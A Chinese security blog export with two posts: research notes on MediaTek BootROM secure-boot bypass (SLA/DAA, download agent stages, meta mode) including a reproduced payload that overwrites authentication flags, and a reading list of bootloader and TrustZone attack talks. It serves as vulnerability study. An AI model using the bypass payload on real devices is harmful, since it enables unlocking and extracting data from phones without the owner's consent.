<h3 id="BROM部分"><a href="#BROM部分" class="headerlink" title="BROM部分"></a>BROM部分</h3><h4 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h4><p>  MTK的话BROM Exp满天飞，多搜一搜可以找到，或者按照<a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/">dissecting-a-mediatek-bootrom-exploit</a>中的办法，应该也可以，或者对于没开SecurityBoot的设备搞个mini DA进去也可以(参考这里 <code>https://github.com/MTK-bypass/bypass_utility/blob/master/main.py#L111</code> )。</p>
<p>这里以某个SoC的BROM为例作分析，推荐使用Ghirda来做，选ARMv7就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">67676         0x1085C         Mediatek bootloader</span><br><span class="line">72020         0x11954         SHA256 hash constants, little endian</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130133517456.png" alt="image-20221130133517456"></p>
<p>前面还是喜闻乐见的中断向量表，根据reset handler，能定位到类似main的位置，但是我们的目的是分析usb dl的逻辑，这里我看了下已知的文章，可以通过handshake来确定，直接暴搜一波 <code>A0 0A 50 05</code>，但是这里需要注意，有两个handshake，uart和usb的，需要做好区分，然后就可以定位到 process_cmd() 里了。</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130133720683.png" alt="image-20221130133720683"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130133745944.png" alt="image-20221130133745944"></th>
</tr>
</thead>
</table>
<p>然后可以还原出来 相关标志位，如 security boot &amp; SLA &amp; DAA。</p>
<p>不过这显然不是这次的目的，这次是想找到盘古议题中提到的两个BROM的漏洞 :)</p>
<h4 id="议题中的漏洞"><a href="#议题中的漏洞" class="headerlink" title="议题中的漏洞"></a>议题中的漏洞</h4><h5 id="vuln1"><a href="#vuln1" class="headerlink" title="vuln1"></a>vuln1</h5><p>根据MTK的公告可知和议题内容，这个应该是那个Issue1，即 <code>Endpoint processing vulnerability</code> 的这枚漏洞 :)</p>
<p>我这里根据几个地方来确认函数位置的</p>
<ul>
<li>  少的可怜的两个字符串 <code>[USBDL]</code> 开头的，和timeout相关</li>
<li>  根据<code>https://github.com/chaosmaster/bypass_payloads</code> 中，我目前这个方案的一些寄存器、函数地址来确定的，比如可以确定 </li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> (*send_usb_response)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>) = (<span class="keyword">void</span>*)******;</span><br><span class="line"><span class="keyword">int</span> (*(*usbdl_ptr))() = (<span class="keyword">void</span>*)******;</span><br><span class="line">*(<span class="keyword">volatile</span> <span class="keyword">uint32_t</span> *)(usbdl_ptr[<span class="number">0</span>] + <span class="number">8</span>) = (<span class="keyword">uint32_t</span>)usbdl_ptr[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">void</span> (*usbdl_get_data)() = usbdl_ptr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">void</span> (*usbdl_put_data)() = usbdl_ptr[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">void</span> (*usbdl_flush_data)() = usbdl_ptr[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124194300872.png" alt="image-20221124194300872"></p>
<ul>
<li>  议题中漏洞特征</li>
</ul>
<p>最终让我找到了这个漏洞，和我最开始预想的差不多，处理USB协议相关的逻辑，不过是在标准的流程后面</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124194448445.png" alt="image-20221124194448445"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124194503152.png" alt="image-20221124194503152"></th>
</tr>
</thead>
</table>
<h5 id="TBD-vuln2"><a href="#TBD-vuln2" class="headerlink" title="[TBD]vuln2"></a>[TBD]vuln2</h5><p>说来也比较巧合，rrr拍的图里似乎没有标题为<code>MTK BootROM Vul #2</code> 的slide，所以我目前还没有分析出来，只找到了一些相关的资料辅助分析:</p>
<ul>
<li>  <a href="https://www.usbzh.com/article/detail-842.html">https://www.usbzh.com/article/detail-842.html</a></li>
<li>  <code>https://yhsnlkm.github.io/2019/08/14/USB相关/应用层遍历所有接入的USB设备-1/</code></li>
<li>  <code>https://github.com/mtek-hack-hack/mtktest/blob/master/%20mtktest%20--username%20qq413187589/N65/N65_V1/usb/src/usbacm_drv.c</code></li>
<li>  <a href="https://shequ.stmicroelectronics.cn/thread-612750-1-1.html">https://shequ.stmicroelectronics.cn/thread-612750-1-1.html</a></li>
</ul>
<p>比较有意思的是链接3里面的这份代码，看着很像古早时期的BROM源码 -.-</p>
<p>在usb相关的目录也找到了一些议题中提到的信息，比如CDC、<code>data_ep_in_info</code>，以及议题截图中一些变量命名，基本上都对的上，我猜测这应该是因为这是一种标准实现，所以延用这些命名方便分析，那么找洞的方向就有了:</p>
<ul>
<li>  继续了解USB CDC </li>
<li>  找一些标准实现看看，找一些特征+已知的USB相关的一些符号判断出来相关的处理逻辑大概在哪里</li>
<li>  结合MTK的公告描述来尝试找这个漏洞(<code>Character-formatting command vulnerability</code>)</li>
</ul>
<p>看了几个地方还不是很确定- -. 失败</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><ul>
<li>  SLA (Serial Link Authorization): 未授权是没办法加载DA的</li>
<li>  DAA (Download agent authentication): 对加载的DA做验证</li>
</ul>
<blockquote>
<p>  当然，如果能绕过SLA，加载自定义的DA，那DAA也是可以绕过的</p>
</blockquote>
<p>通过SP Flash Tool可以对设备进行读写</p>
<ul>
<li>  Download-Agent: 一小段程序，加载到SRAM中和Host交互，类比高通的FH</li>
<li>  Scatter: 可以理解成flash的内存布局，描述每个分区的情况，如起始地址、大小、属性等</li>
<li>  Authentication File &amp; Cert File: 开启了SecurityBoot的设备需要提供，用于验证DownloadAgent是否合法</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124195803394.png" alt="image-20221124195803394"></p>
<p>所以，对于开了SecurityBoot的设备，就不能用公版DA了，大佬的议题中也是以开了SecurityBoot的设备为例讲的，通过前面的漏洞disable sla &amp; daa，从而实现加载自定义的DA，然后通过这个DA来读写任意分区，从而实现加载任意代码的目的 :)</p>
<h4 id="Attacking-DA"><a href="#Attacking-DA" class="headerlink" title="Attacking DA"></a>Attacking DA</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130231704274.png" alt="image-20221130231704274"></p>
<p>大佬在议题中对MTK的DA做了详细的介绍，这里主要涉及了</p>
<ul>
<li>  DA如何被加载</li>
<li>DA的执行阶段<ul>
<li>  stage1</li>
<li>  stage2</li>
</ul>
</li>
<li>  如何攻击DA实现任意分区读写</li>
</ul>
<p>MTK的SP Flash Tool里带的这个公版DA其实是个DA的合集，SP FlashTool根据读到的chip id选对应的DA用来交互</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208231817640.png" alt="image-20221208231817640"></p>
<h5 id="DA-stage1"><a href="#DA-stage1" class="headerlink" title="DA stage1"></a>DA stage1</h5><table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208231856888.png" alt="image-20221208231856888"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208231928842.png" alt="image-20221208231928842"></th>
</tr>
</thead>
</table>
<p>这里提到了一个EMI file，stage1会根据这个EMI file来初始化DRAM，既然可以从preloader里后去，那么前面的基线代码里妥妥也会有了</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208231959205.png" alt="image-20221208231959205"></p>
<p>当然也可以借助工具来解析出来，比如这个 <code>https://github.com/mr-m96/MTKPreloaderParser</code>， 相关内容就不展开了，为了理解议题内容的话，只需要了解这个东西的作用以及在哪里就行了:)</p>
<h5 id="DA-stage2"><a href="#DA-stage2" class="headerlink" title="DA stage2"></a>DA stage2</h5><p>stage2是比较关键的内容了，它被stage1加载到了dram里执行(前面初始化dram这里要用)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208232056511.png" alt="image-20221208232056511"></p>
<p>这里列举了secure enable的情况，DA的能力将受到限制，即一部分功能无法使用，作者通过之前的BROM exploit disable了daa，然后加载自己patch过的da，从而使用这个patch过的da来实现全分区的读写，以及使用da中全部的功能。</p>
<h5 id="policy-part-map？"><a href="#policy-part-map？" class="headerlink" title="policy_part_map？"></a><strong>policy_part_map？</strong></h5><p>这部分感觉PPT顺序有点问题，不过也不是特别影响理解吧，主要是启动过程中对加载的镜像完整性校验相关的介绍，这块和后面大佬讲攻击流程能对上。</p>
<p>github随便搜了下，就能看明白这个东西了 :)</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208232133500.png" alt="image-20221208232133500"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208232141320.png" alt="image-20221208232141320"></th>
</tr>
</thead>
</table>
<p>主要是有这么个结构体来描述对应的镜像的安全配置，是否受到保护、能不能刷这个分区等等啥的。</p>
<p>相关的部分代码，这是在加载镜像之前，加载这个policy，然后根据结果去对镜像做对应的操作，比如 是否应该做校验</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> <span class="title">get_sec_policy</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> policy_entry_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">4<span class="keyword">unsigned</span> <span class="keyword">int</span> sboot_state = <span class="number">0</span>;</span><br><span class="line">4<span class="keyword">unsigned</span> <span class="keyword">int</span> lock_state = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">4<span class="keyword">unsigned</span> <span class="keyword">char</span> sec_policy = <span class="number">0</span>;</span><br><span class="line">4<span class="keyword">unsigned</span> <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">4ret = get_sec_state(&amp;sboot_state, &amp;lock_state);</span><br><span class="line">4<span class="comment">/* this API won&#x27;t return error, so we don&#x27;t process it here */</span></span><br><span class="line"></span><br><span class="line">4<span class="keyword">if</span> (sboot_state == <span class="number">0</span> &amp;&amp; lock_state == LKS_UNLOCK)</span><br><span class="line">44sec_policy = g_policy_map[policy_entry_idx].sec_sbcdis_unlock_policy;</span><br><span class="line">4<span class="keyword">else</span> <span class="keyword">if</span> (sboot_state == <span class="number">0</span> &amp;&amp; lock_state != LKS_UNLOCK)</span><br><span class="line">44sec_policy = g_policy_map[policy_entry_idx].sec_sbcdis_lock_policy;</span><br><span class="line">4<span class="keyword">else</span> <span class="keyword">if</span> (sboot_state == <span class="number">1</span> &amp;&amp; lock_state == LKS_UNLOCK)</span><br><span class="line">44sec_policy = g_policy_map[policy_entry_idx].sec_sbcen_unlock_policy;</span><br><span class="line">4<span class="keyword">else</span> <span class="keyword">if</span> (sboot_state == <span class="number">1</span> &amp;&amp; lock_state != LKS_UNLOCK)</span><br><span class="line">44sec_policy = g_policy_map[policy_entry_idx].sec_sbcen_lock_policy;</span><br><span class="line"></span><br><span class="line">4<span class="keyword">return</span> sec_policy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="BROM-EXPLOIT"><a href="#BROM-EXPLOIT" class="headerlink" title="BROM EXPLOIT"></a>BROM EXPLOIT</h4><p>这里的话，参考<a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/">dissecting-a-mediatek-bootrom-exploit</a> 的介绍会了解的更清楚，简化一下描述就是:</p>
<ul>
<li><p>需要找到需要的函数、全局变量的地址</p>
<ul>
<li>  <code>send_usb_response</code></li>
<li>  <code>usbdl_put_dword</code></li>
<li>  <code>usbdl_put_data</code></li>
<li>  <code>usbdl_get_data</code></li>
<li>  <code>uart_reg0</code></li>
<li>  <code>uart_reg1</code></li>
<li>  <code>sla_passed</code></li>
<li>  <code>skip_auth_1</code></li>
<li>  <code>skip_auth_2</code></li>
</ul>
</li>
<li><p>exp工作流程参考 <a href="https://github.com/MTK-bypass/exploit_common/blob/f158851273fec965f673af8647f01257fc9dea38/main.c">common exp</a>，类似议题中的Vuln1</p>
<p>  <img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130140148909.png" alt="image-20221130140148909"></p>
</li>
</ul>
<p>当然，所需要覆盖的变量也比较好找，把cmd是 <code>0xd8</code>的 <code>CMD_GET_TARGET_CONFIG</code>为入口就可以找到需要的东西了</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130134354668.png" alt="image-20221130134354668"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130134410683.png" alt="image-20221130134410683"></th>
</tr>
</thead>
</table>
<h5 id="common-exp"><a href="#common-exp" class="headerlink" title="common exp"></a>common exp</h5><p>直接参考  <a href="https://github.com/MTK-bypass/exploit_common/blob/f158851273fec965f673af8647f01257fc9dea38/main.c">common exp</a>，就行，利用漏洞获得的任意地址读写能力去覆盖</p>
<ul>
<li>  <code>sla_passed</code></li>
<li>  <code>skip_auth_1</code></li>
<li>  <code>skip_auth_2</code></li>
</ul>
<p>这三个变量，然后就可以加载任意da，并且禁用了daa</p>
<p><code>start.S</code> 直接跳main函数，里面逻辑也很简单，覆盖变量，然后接收下个阶段的交互(usb handshake)，方便后续加载DA啥的，交互完毕，就正常进入usbdl模式去了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    send_usb_response(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Sending pattern\n&quot;</span>);</span><br><span class="line">    usbdl_put_dword(<span class="number">0xA1A2A3A4</span>);</span><br><span class="line"></span><br><span class="line">    *sla_passed = <span class="number">1</span>;</span><br><span class="line">    *skip_auth_1 = <span class="number">1</span>;</span><br><span class="line">    *skip_auth_2 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Waiting for handshake\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> sequence[] = &#123;<span class="number">0xA0</span>, <span class="number">0x0A</span>, <span class="number">0x50</span>, <span class="number">0x05</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> hs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++, hs = <span class="number">0</span>) &#123;</span><br><span class="line">        usbdl_get_data(&amp;hs, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sequence[i] == hs) &#123;</span><br><span class="line">            hs = ~hs;</span><br><span class="line">            usbdl_put_data(&amp;hs, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">          print(<span class="string">&quot;Handshake failed\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&quot;Handshake..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Handshake completed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="MTE-mode"><a href="#MTE-mode" class="headerlink" title="MTE mode"></a>MTE mode</h4><p>这个模式看描述是MTK的一个特殊的测试模式，也算是一个之前没见过的攻击面</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124201408856.png" alt="image-20221124201408856"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124222151110.png" alt="image-20221124222151110"></th>
</tr>
</thead>
</table>
<p>在这个模式下，可以做很多事情:</p>
<ul>
<li>  Obtain/Modify EFUSE/RPMB Info </li>
<li>  Load Customized OS </li>
<li>  USERDATA Decrypt</li>
<li>  Obtain/Modify Hardware Key </li>
<li>  Unlock Bootloader</li>
<li>  …</li>
</ul>
<p>巧了，咱手里正好有个某个MTK方案的设备的完整镜像 :-) 根据PPT中的信息，可以check下相关的逻辑</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124210054040.png" alt="image-20221124210054040"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124221837757.png" alt="image-20221124221837757"></th>
</tr>
</thead>
</table>
<p>我这个设备没有找到相关的逻辑，应该是删除了这个模式，不过幸运的是 <code>meta_tst</code> 没有删除:)，而且根据PPT里的内容，这个服务应该是比较核心的，MTK设计了私有协议做一些交互</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124212759107.png" alt="image-20221124212759107"></p>
<p>分析的难度也不大，而且有趣的是如果你在github上搜一些特定的字符串，会发现很多有意思的repo :) 这对理解一些逻辑很有帮助</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221124221704268.png" alt="image-20221124221704268"></p>
<h4 id="more-exploit"><a href="#more-exploit" class="headerlink" title="more exploit"></a>more exploit</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221208232231058.png" alt="image-20221208232231058"></p>
<p>这没什么可说的，既然从源头破坏掉了信任链，那么自然可以做任何事 😎</p>
<p>基本上一些很成熟的“取证”工具都能干- 。- 比如这一篇</p>
<p><a href="https://blog.oxygen-forensic.com/support-for-mediatek-devices-in-oxygen-forensic-detective/">support-for-mediatek-devices-in-oxygen-forensic-detective</a></p>
<p>感兴趣的话可以阅读一下</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  这次虽然过程艰辛又带着一些遗憾，不过个人起码了解了MTK方案BROM Exploit的思路，vuln#2还没找到，后面等不忙了时间多了再尝试看看好了 :) </p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/SoCXin/MT6737/tree/master/linux">https://github.com/SoCXin/MT6737/tree/master/linux</a></p>
<p><a href="https://github.com/chaosmaster/bypass_payloads">https://github.com/chaosmaster/bypass_payloads</a></p>
<p><a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/">https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/</a></p>
<p><a href="https://www.cnblogs.com/wen123456/p/14034493.html">https://www.cnblogs.com/wen123456/p/14034493.html</a></p>
<p><a href="https://blog.csdn.net/u011784994/article/details/104898430">https://blog.csdn.net/u011784994/article/details/104898430</a></p>
<p><a href="https://github.com/rn2/ven/blob/db95d7f096/hardware/meta/common/README">https://github.com/rn2/ven/blob/db95d7f096/hardware/meta/common/README</a></p>
<p><a href="https://blog.oxygen-forensic.com/support-for-mediatek-devices-in-oxygen-forensic-detective/">https://blog.oxygen-forensic.com/support-for-mediatek-devices-in-oxygen-forensic-detective/</a></p>
]]></content>
      <categories>
        <category>Hackcon</category>
      </categories>
      <tags>
        <tag>MTK</tag>
        <tag>preloader</tag>
        <tag>BootROM</tag>
      </tags>
  </entry>
  <entry>
    <title>最近看过的议题&amp;文章(Bootloader/TZ)</title>
    <url>/2022/12/31/%E6%9C%80%E8%BF%91%E7%9C%8B%E8%BF%87%E7%9A%84%E8%AE%AE%E9%A2%98-%E6%96%87%E7%AB%A0-Bootloader-TZ/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>  最近看了一些<code>Bootloader&amp;TZ</code>以及相关的议题，主要是ARM架构下的内容；正好这几个月我的<code>Leader</code>领着我们组一起学习<code>ARMv8&amp;v9</code>架构相关的知识，在阅读这些材料的时候给我提供了不少的帮助，让我理解起来更加容易，也算是变相检验学习成果咯。</p>
<span id="more"></span>

<p>于是我便有了这样的感慨 :)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221231181650825.png" alt="image-20221231181650825"></p>
<h2 id="Security-Boot-amp-Bootloader相关"><a href="#Security-Boot-amp-Bootloader相关" class="headerlink" title="Security Boot &amp; Bootloader相关"></a>Security Boot &amp; Bootloader相关</h2><p>没看完的材料就是TBD的状态 :(</p>
<ul>
<li><p><a href="https://github.com/hhj4ck/BLUnlock/blob/master/ISC2017.pdf">没钥匙也要拧开BOOTLOADER的锁</a> - Guanxing Wen, ISC, 2017</p>
<blockquote>
<p>  厂商在ABL里增加unlock bl验证逻辑，针对这部分的安全性研究</p>
</blockquote>
</li>
<li><p><a href="https://github.com/hhj4ck/BLUnlock/blob/master/ISC2018.pdf">启动链脆弱性分析</a>  - Guanxing Wen, ISC, 2018</p>
<blockquote>
<p>  三星的安全启动分析，攻击TZ实现绕过锁屏码; reference里 <code>@NWMonster 三星的分析和利⽤</code> 我也没找到:( 可惜</p>
</blockquote>
</li>
<li><p><a href="https://speakerdeck.com/hhj4ck/el3-tour-get-the-ultimate-privilege-of-android-phone">EL3 Tour: Get The Ultimate Privilege of Android Phone</a> - Guanxing Wen, Infiltrate, 2019</p>
<blockquote>
<p>  华为的安全启动探究，利用bootrom漏洞实现打破信任链，从而实现拿到EL1、EL3的权限，然后攻击TEE，非常精彩的议题；需要ARMv8架构相关的知识，理解起来会更轻松 :)</p>
</blockquote>
</li>
<li><p><a href="https://raw.githubusercontent.com/hhj4ck/checkm30/master/checkm30.pdf">Checkmate Mate30</a> - Slipper &amp; Guanxing Wen, <em>MOSEC</em>, 2021</p>
<blockquote>
<p>  华为Mate30的BootROM漏洞挖掘&amp;利用，和之前EL3 Tour那个类似；但是华为通过OTA修了这个洞也是很神奇，<del>不知道是不是用的ARM FPB特性做的</del></p>
</blockquote>
</li>
<li><p><a href="">MediAttack - break the boot chain of MediaTek SoC</a> - neoni, MOSEC, 2022</p>
<blockquote>
<p>  MTK安全启动分析以及BootROM漏洞挖掘&amp;利用，打破信任链后可以实现对任意分区读写、解密数据等，配合<a href="https://github.com/MTK-bypass/bypass_utility_">mtk-bypass</a>阅读体验更好</p>
</blockquote>
</li>
<li><p><a href="https://raw.githubusercontent.com/TaszkSecLabs/presentations/main/US-21-Komaromy-How-To-Tame-Your-Unicorn.pdf">How To Tame Your Unicorn</a> - Daniel Komaromy &amp; Lorant Szabo, <em>Black Hat USA</em>, 2021</p>
<blockquote>
<p>  打华为的基带，顺带BootROM的漏洞，配合白皮书阅读体验更佳</p>
</blockquote>
</li>
<li><p><a href="https://labs.taszk.io/articles/post/huawei_kirin990_bootrom_patch/">Test Point Break: Analysis of Huawei’s OTA Fix For BootROM Vulnerabilities</a> - Taszk Lab, 2021</p>
<blockquote>
<p>  <code>How to Tame Your Unicorn</code>BH议题中BootROM漏洞 OTA fix后的分析，探究华为的修复手法。</p>
</blockquote>
<ul>
<li>  <a href="https://labs.taszk.io/blog/post/bootrom_head_resend/">CVE-2021-22434: Huawei Arbitrary Write in BootROM USB Stack</a></li>
<li>  <a href="https://labs.taszk.io/blog/post/bootrom_usb/">CVE-2021-22429: Huawei Buffer Overflow in BootROM USB Stack</a></li>
</ul>
</li>
<li><p><a href="https://www.youtube.com/watch?v=0_E2NxpCAfw">Your Peripheral Has Planted Malware — An Exploit of NXP SOCs Vulnerability</a> - Yuwei ZHENG, Shaokun CAO, Yunding JIAN, Mingchuang QIN, Defcon26</p>
<blockquote>
<p>  NXP SOC安全启动的错误实现导致可以打破信任链植入恶意程序</p>
</blockquote>
</li>
<li><p><a href="https://hardwear.io/usa-2019/presentations/Top-10-Secure-Boot-Mistakes-v1.1-hardwear-io-usa-2019-jasper-van-woudenberg.pdf">Top 10 Secure Boot mistakes</a> - Jasper van Woudenberg, hardware.io, 2019</p>
<blockquote>
<p>  这个算是一个总结性质的分享，总结了常见的安全启动的错误实现，已经相关的例子，对于BSP来说是个不错的参考材料？</p>
</blockquote>
</li>
<li><p><a href="https://raw.githubusercontent.com/windknown/presentations/master/Attack_Secure_Boot_of_SEP.pdf">Attack Secure Boot of SEP</a> - Xu Hao of Team Pangu, MOSEC, 2020</p>
<blockquote>
<p>  TBD</p>
</blockquote>
</li>
<li><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Breaking-Secure-Bootloaders.pdf">Breaking Secure Bootloaders</a> Iskuri1, BH USA, 2021</p>
<blockquote>
<p>  TBD</p>
</blockquote>
</li>
<li><p><a href="https://eshard.com/posts/pixel6_bootloader">eshared的pixel6_bootloader安全研究系列</a></p>
<blockquote>
<p>  Pixel6修复了一系列bootloader的漏洞，作者通过bindiff找到，并深入研究了这些漏洞</p>
</blockquote>
</li>
</ul>
<h2 id="TZ相关"><a href="#TZ相关" class="headerlink" title="TZ相关"></a>TZ相关</h2><p>没看完的材料就是TBD的状态 :(</p>
<ul>
<li><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Shen-Attacking-Your-Trusted-Core-Exploiting-Trustzone-On-Android.pdf">Attacking your “Trusted Core” Exploiting TrustZone on Android</a> - Di Shen (@returnsme), BH USA, 2015</p>
<blockquote>
<p>  华为Mate7的安全研究，从REE打到TEE</p>
</blockquote>
</li>
<li><p><a href="">Blue Pill for Your Phone</a> - Oleksandr Bazhaniuk &amp; Yuriy Bulygin, BH USA, 2017</p>
<blockquote>
<p>  Nexus&amp;Pixel EL2的研究</p>
</blockquote>
</li>
<li><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf">BREAKING SAMSUNG’S ARM TRUSTZONE</a> - Maxime Peterlin &amp; Alexandre Adamski &amp; Joffrey Guilbon, BH USA, 2019</p>
<blockquote>
<p>TBD</p>
</blockquote>
</li>
<li><p><a href="">暗涌2020-小米5c中国产自研手机芯片澎湃S1</a> - Slipper, MOSEC, 2020</p>
<blockquote>
<p>  没找到Slide :( 只能结合<a href="https://evilpan.com/2020/07/25/mosec2020/">evilpan</a>的博客来理解了:)  一套fullchain exploit，从EL0一路打到S-EL1</p>
</blockquote>
</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>涉及底层的内容，也是上面学习上面内容的时候找到的，归类到这里 :)</p>
<ul>
<li><p><a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html">2212_huawei-security-hypervisor</a></p>
<blockquote>
<p>  详细地分析了华为的EL2实现，这篇详细到什么程度呢？我认为这是一篇生动形象的计算机体系结构课程 :) 非常值得阅读，全搞明白对ARM体系的理解要求很高。</p>
</blockquote>
</li>
<li><p><a href="https://blog.impalabs.com/2111_attacking-samsung-rkp.html">Attacking Samsung RKP</a></p>
<blockquote>
<p>  TBD</p>
</blockquote>
</li>
<li><p><a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html">A Samsung RKP Compendium</a></p>
<blockquote>
<p>  TBD</p>
</blockquote>
</li>
<li><p><a href="https://blog.impalabs.com/2212_advisory_huawei-secure-monitor.html">2212_advisory_huawei-secure-monitor</a></p>
<blockquote>
<p>  华为EL3 漏洞挖掘&amp;利用，可以配合闻观行的 <code>EL3 Tour </code> 议题阅读</p>
</blockquote>
</li>
<li><p><a href="https://fredericb.info/archives.html">fred’s notes</a></p>
<blockquote>
<p>  bootloader、security boot相关的博客都值得阅读</p>
</blockquote>
</li>
<li><p><a href="https://alephsecurity.com/2018/01/22/qualcomm-edl-1"><strong>Exploiting Qualcomm EDL Programmers</strong>系列</a></p>
<ul>
<li>  一共五篇，从网上泄漏的firehose开始研究，探究高通的安全启动、firehose功能，后面利用某些设备实现上的缺陷(开了secureboot的设备的firehose依然实现了peek、poke)实现内存读写，进而在不同设备上实现代码执行等操作。</li>
</ul>
</li>
<li><p><a href="https://blog.quarkslab.com/attacking-titan-m-with-only-one-byte.html">attacking-titan-m-with-only-one-byte</a></p>
<blockquote>
<p>  TBD</p>
</blockquote>
</li>
</ul>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><ol>
<li><p>  这些内容基本上都是围绕ARM架构做的安全研究，在学习的过程中会不自觉的拿optee来做对比，好让自己更容易理解这些内容 </p>
</li>
<li><p>  看了这些材料以及大佬分享的时间，这些研究真的太有意思了，我怎么没有早点看到 </p>
</li>
<li><p>  行业原因自然形成的壁垒，在做底层的研究的时候真的很明显，比如BootROM，如果有个手册的话…MTK那个BootROM我看过，这要没手册也太难分析了😭</p>
</li>
<li><p>  持续学习非常重要，正反馈让人觉得很爽 😄</p>
</li>
</ol>
<hr>
<p>恰好今天正好是2022年最后一天，转到IoT组也一年多了，能感受到自己在一点一点进步:</p>
<ul>
<li><p>  技术</p>
</li>
<li><p>  软技能(沟通协作、写文档)</p>
</li>
</ul>
<p>非常感谢玉伟对我的帮助和指导，在对本篇文章中资料的学习过程中，总能和之前我学习or工作中遇到的东西呼应起来，我也想起了和玉伟<code>one on one</code>的时候他给我讲学习方法、以及他个人是怎么做阅读的，醍醐灌顶来形容我现在的感受可能会比较恰当 :) </p>
<p><strong>希望23年可以进步更多一些，日拱一卒，功不唐捐。</strong></p>
